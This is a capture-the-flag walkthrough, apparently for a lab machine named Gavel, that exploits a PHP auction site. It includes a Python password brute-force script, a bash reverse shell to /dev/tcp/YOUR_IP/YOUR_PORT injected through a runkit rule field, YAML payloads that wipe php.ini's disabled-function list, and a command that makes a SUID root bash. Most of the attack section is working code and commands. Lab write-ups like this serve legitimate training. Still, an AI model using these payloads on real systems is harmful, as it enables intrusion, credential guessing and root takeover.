# scan ports 

```
nmap -sVC 10.10.11.97
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 12:29 EST
Nmap scan report for 10.10.11.97
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 (ECDSA)
|_  256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://gavel.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: gavel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.54 seconds

```


lets check the web server and it to our hosts config


ok first we need to figure out the hidden pages and subdomains in this website i didnot find any subdomains any way gobuster give me some inersting data

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://gavel.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 274]
/.git/HEAD            (Status: 200) [Size: 23]
/.htaccess            (Status: 403) [Size: 274]
/.htpasswd            (Status: 403) [Size: 274]
/admin.php            (Status: 302) [Size: 0] [--> index.php]
/assets               (Status: 301) [Size: 307] [--> http://gavel.htb/assets/]
/includes             (Status: 301) [Size: 309] [--> http://gavel.htb/includes/]
/index.php            (Status: 200) [Size: 14014]
/rules                (Status: 301) [Size: 306] [--> http://gavel.htb/rules/]
/server-status        (Status: 403) [Size: 274]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

> we find admin.php i redirects us to index.html so our goal is to find any valunrablity to login with admin i found that /.git has the source code of this website so lets explore it to find any thing intersting in this website

we can get the ful sorce code with git-dumber

this is the link of its repo

```
https://github.com/arthaud/git-dumper
```


ok we can read the source code of admin page 

```
?php if (!isset($_SESSION['user'])): ?>
                <li class="nav-item"><a class="nav-link" href="index.php"><i class="fas fa-fw fa-home"></i><span>Home</span></a></li>
                <li class="nav-item"><a class="nav-link" href="login.php"><i class="fas fa-fw fa-sign-in-alt"></i><span>Login</span></a></li>
                <li class="nav-item"><a class="nav-link" href="register.php"><i class="fas fa-fw fa-user-plus"></i><span>Register</span></a></li>
            <?php else: ?>
                <li class="nav-item"><a class="nav-link" href="index.php"><i class="fas fa-fw fa-home"></i><span>Home</span></a></li>
                <li class="nav-item"><a class="nav-link" href="inventory.php"><i class="fas fa-box-open"></i><span>Inventory</span></a></li>
                <li class="nav-item active"><a class="nav-link" href="bidding.php"><i class="fas fa-hammer"></i><span>Bidding</span></a></li>
                <?php if ($_SESSION['user']['role'] === 'auctioneer'): ?>
                    <li class="nav-item"><a class="nav-link" href="admin.php"><i class="fas fa-tools"></i><span>Admin Panel</span></a></li>
                <?php endif; ?>
                <hr class="sidebar-divider d-none d-md-block">
                <li class="nav-item"><a class="nav-link" href="logout.php"><i class="fas fa-sign-out-alt"></i><span>Logout</span></a></li>
            <?php endif; ?>
```

> we see here the authentication condtions and we see when it be  'auctioneer' it will can acsses the admin page so here we are and after enumration i found the file that checks the bid_amount and the file responder is bid_handler it always request to this file so we can read it's source code

- and we found there is a some thing intersting in this part

```
$current_bid = $bid_amount;
$previous_bid = $auction['current_price'];
$bidder = $username;

$rule = $auction['rule'];
$rule_message = $auction['message'];

$allowed = false;

try {
    if (function_exists('ruleCheck')) {
        runkit_function_remove('ruleCheck');
    }
    runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
    error_log("Rule: " . $rule);
    $allowed = ruleCheck($current_bid, $previous_bid, $bidder);
} catch (Throwable $e) {
    error_log("Rule error: " . $e->getMessage());
    $allowed = false;
}
```
> in this part we see he creates like a temporary function that can we put our command in the rule form and the function will add this payload to this bid so if the bidding has been succsufell it will go to the runkit rulecheck function and runs our payload and gain reverse shell!


```
runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
```


> when we go to the register page and trying to create new account with this name  'auctioneer' it will respond to us that name is already exsit so we know now its a normal user we can simply brute force its password to login with admin panel


> so i have created a simple script that brute force the password if it give me status_code 301 or the "Invalid" massege disaapeard that means in sha allah that we found the correct password and we can acsses admin page and exploit our rce valunrblity


```
#by skaw 

import requests
import sys

username = "auctioneer"

url = "http://gavel.htb/login.php"

with open("rockyou.txt","r",encoding="latin-1", errors="ignore") as f:
    
    for password in f:
        password = password.strip()
        request = {"username": username, "password": password}
        post = requests.post(url,data = request,allow_redirects=False)

        if post.status_code == 302 or "Invalid" not in post.text:
            print(password)
            sys.exit(0)
```

- dont worry it can take a long time just be pation


> after you login with admin account now we got to admin panel and put our payload code in the rule form as we understand where is the rce valunrablity we can put a reverse shell command here

```
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'");
```

> and now we just has to bidding this bid to go to try condtion and our payload will be excuted and boom we have a reverse shell now trying to switch to the user auctioneer with the same password we have get


```
su - auctioneer
```

and yay its worked :)

we can get the user.txt now

```
cat user.txt
```

# second part is privesc :(


ok fisrt we check if any app has a suid can we exploit it

```
find / -perm -u=s -type f 2>/dev/null
```

it didnot give me something intersting

```
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

- lets see all proces if any proces runnig with root and can we exploit or have a write and excute permistions we can get root

```
ps aux
```

and no thing strange or intersting except this

```
root         933  0.0  0.0  19128  3848 ?        Ss   14:25   0:00 /opt/gavel/gaveld
```

- this is not built in system service its just a uniqe binary runnig by root i think this is the runner of bid actions
i tired to if we can replace it with a malcios program with the same name to make root excute this commands but i dont have permtions any way

- but i found a intersting file in hidden dir in /opt/gavel/ its called php.ini lets see it

```
auctioneer@gavel:/opt/gavel/.config/php$ cat php.ini
```
and we see it its look like it block some commands for security

```
cat php.ini
engine=On
display_errors=On
display_startup_errors=On
log_errors=Off
error_reporting=E_ALL
open_basedir=/opt/gavel
memory_limit=32M
max_execution_time=3
max_input_time=10
disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client
scan_dir=
allow_url_fopen=Off
allow_url_include=Off
```


so lets check which group we are

```
id
```

it shows this to me 

```
uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)
```

> and here we have known that we are in gave-seller group lets see any dir or file intersting we have a read (r) , write (w) , excute (x) in this group

```
find / -group gavel-seller -perm /g=rwx 2>/dev/null
```

it shows to us this lets checks the both

```
/run/gaveld.sock
/usr/local/bin/gavel-util
```

so lets go to this directory and know how the gavel utlity binary works 

```
auctioneer@gavel:/usr/local/bin$ gavel-util  
gavel-util
Usage: gavel-util <cmd> [options]
Commands:
  submit <file>           Submit new items (YAML format)
  stats                   Show Auction stats
  invoice                 Request invoice
```

> and here we are thier is a choice we can upload an item in yaml format so if we added an item with the malcious rule we can grant an root rce privlage its the same valunrablity that in website if gaveld is the same functolity

lets know what its data look like in yamal extenstion so we found there is a yaml file called 

sample.yaml in /opt/gavel after our enumration

```
cat sample.yaml
```

its give me that

```
item:
name: "Dragon's Feathered Hat"
description: "A flamboyant hat rumored to make dragons jealous."
image: "https://example.com/dragon_hat.png"
price: 10000
rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
rule: "return ($current_bid >= $previous_bid * 1.2) && ($bidder != 'sado');"
```

so can simply make a new malcios file with this creditnals and just put our command in the rule 

first we have to enable the disabled php function pn php.ini


we can go to any writeable directory

```
cat > /tmp/enable.yaml << 'EOF' 
```

this command we sayed to this to end the file when reading EOF 

anyways lets remove the blocked php functions using runkit rce we found in bid_handler the gaveld will be as same this file i think

```
name: "enable"
description: "A flamboyant hat rumored to make dragons jealous."
image: "https://example.com/dragon_hat.png"
price: 10000
rule_msg: "bypassed the blocked commands!"
rule: file_put_contents("/opt/gavel/.config/php/php.ini", "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
```

```
/usr/local/bin/gavel-util submit /tmp/enable.yaml
```

> i did not know any thing on php commands i tell ai to write to me the command ok after that we have to submit this yaml extestion and make it succseful to make gaveld which running with root privlage if it succsuful we can now put the blocked commands with another yaml extenstion and sumbit the extenstion and submit it so the gaveld will read it too and run the blocked command without any error we can use the blocked commands now to copy a /bin/bash which is the bash shell and give it the suid of the gaveld (chmod +s) and by doing this we can acsses a privlaged root bash and get root.txt so we can use make an yaml extestion and submit it

```
cat > /tmp/rootshell.yaml << 'EOF'
```

```
name: "rootshell"
description: "make suid bash"
image: "x.png"
price: 1
rule_msg: "rootshell"
rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
EOFcat > /tmp/rootshell.yaml << 'EOF'
> name: "rootshell"
> description: "make suid bash"
> image: "x.png"
> price: 1
> rule_msg: "rootshell"
> rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
> 
EOF
```

```
/usr/local/bin/gavel-util submit /tmp/rootshell.yaml
```

and now we can just go to this directory of the copyied bash shell with -p privlaged mode to save its suid and be root succesful

```
/opt/gavel/rootbash -p
```

and boom we are root

```
cat /root/root.txt
```